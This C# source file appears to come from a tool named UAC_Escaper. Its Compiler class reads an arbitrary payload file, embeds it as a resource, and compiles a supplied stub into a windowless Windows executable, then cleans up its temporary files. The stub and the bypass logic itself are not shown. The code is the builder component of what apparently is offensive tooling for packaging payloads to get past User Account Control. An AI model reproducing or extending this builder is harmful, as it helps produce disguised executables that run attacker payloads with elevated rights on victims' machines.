using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Resources;

namespace UAC_Escaper.Build
{
    public class Compiler
    {
        public string Compile(Builder builder)
        {
            string destinationIconPath = Environment.CurrentDirectory + "\\icon.ico";

            try
            {
                Directory.CreateDirectory(builder.TempDirectory);
                string[] referencedAssemblies = new string[] {"System.dll","System.Windows.Forms.dll"};
                Dictionary<string, string> providerOptions = new Dictionary<string, string>() {{"CompilerVersion", "v4.0" }};

                string compilerOptions = "/target:winexe /platform:anycpu /optimize+";

                using (CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider(providerOptions))
                {
                    CompilerParameters compilerParameters = new CompilerParameters(referencedAssemblies)
                    {
                        GenerateExecutable = true,
                        OutputAssembly = builder.SaveFileName,
                        CompilerOptions = compilerOptions,
                        TreatWarningsAsErrors = false,
                        IncludeDebugInformation = false,
                        TempFiles = new TempFileCollection(builder.TempDirectory, false),
                    };

                    using (ResourceWriter rw = new ResourceWriter(Path.Combine(builder.TempDirectory, builder.ResourceManager + ".resources")))
                    {
                        rw.AddResource(builder.PayloadResources, File.ReadAllBytes(builder.PayloadPath));
                        rw.Generate();
                    }
                    compilerParameters.EmbeddedResources.Add(Path.Combine(builder.TempDirectory, builder.ResourceManager + ".resources"));

                    CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, builder.StubCs);
                    if (compilerResults.Errors.Count > 0)
                    {

                        foreach (CompilerError compilerError in compilerResults.Errors)
                        {
                            Debug.WriteLine(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
                                compilerError.Line, compilerError.Column, compilerError.FileName));
                            return string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
                                compilerError.Line, compilerError.Column, compilerError.FileName);
                        }
                    }

                    try
                    {
                        if (File.Exists(destinationIconPath)) File.Delete(destinationIconPath);
                        if (Directory.Exists(builder.TempDirectory)) Directory.Delete(builder.TempDirectory, true);
                    }
                    catch { }
                    return "Done!";
                }
            }
            catch (Exception ex)
            {
                try
                {
                    if (File.Exists(destinationIconPath)) File.Delete(destinationIconPath);
                    if (Directory.Exists(builder.TempDirectory)) Directory.Delete(builder.TempDirectory, true);
                }
                catch { }
                return ex.Message;
            }
        }
    }
}
